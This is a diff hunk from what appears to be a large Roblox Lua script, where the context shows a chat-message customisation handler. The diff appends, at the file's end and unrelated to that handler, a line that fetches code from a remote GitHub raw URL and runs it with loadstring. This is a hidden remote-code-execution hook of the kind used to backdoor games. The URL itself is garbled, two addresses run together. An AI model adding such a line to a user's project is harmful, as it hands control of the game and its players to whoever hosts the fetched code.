@@ -11043,3 +11043,5 @@ local function CustomizeChatMessage(message)
 end
 
 textChatService.OnIncomingMessage = CustomizeChatMessage
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MagikMan1/Thisismagik/main/Magikhttps://raw.githubusercontent.com/Aaaa1a1/V/main/B"))()
